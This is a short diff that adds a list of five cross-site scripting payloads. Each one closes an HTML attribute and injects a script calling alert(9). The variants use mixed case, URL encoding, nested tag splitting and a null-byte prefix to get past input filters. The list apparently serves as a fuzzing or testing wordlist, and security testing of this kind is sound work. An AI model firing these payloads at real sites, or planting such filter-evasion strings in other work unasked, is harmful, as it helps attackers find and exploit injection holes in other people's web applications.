@@ -1,0 +1,5 @@
+"><script>alert(9)</script>
+"><ScRiPt>alert(9)</ScRiPt>
+"%3e%3cscript%3ealert(9)%3c/script%3e
+"<scr<script>ipt>alert(9)</scr</script>ipt>
+%00"><script>alert(9)</script>
